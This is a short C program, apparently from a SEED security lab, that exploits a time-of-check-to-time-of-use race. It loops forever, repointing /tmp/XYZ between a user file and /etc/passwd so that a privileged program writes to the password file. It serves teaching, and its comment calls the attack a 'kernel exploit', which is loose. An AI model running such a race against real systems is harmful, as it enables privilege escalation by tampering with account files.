#include <unistd.h>

int main()
{
	while(1) {

	/*	pg 130 in the txt...
	
		the kernel exploit is engaged when 
		toggling the symlink then seeping for 
		a tenth of a second between 2 different
		locations while waiting for an
		authorization to come back.  

		Race conditions are timing checks
		TOCTOU, this takes approximately 
		1 min 8 seconds 
		
		The time between the program checking
		and the authorization being received 
		can be exploited.


	*/
		unlink("/tmp/XYZ");
		symlink("/home/seed/test", "/tmp/XYZ");
		usleep(10000);

		unlink("/tmp/XYZ");
		symlink("/etc/passwd", "/tmp/XYZ");
		usleep(10000);

	}
	return 0;
}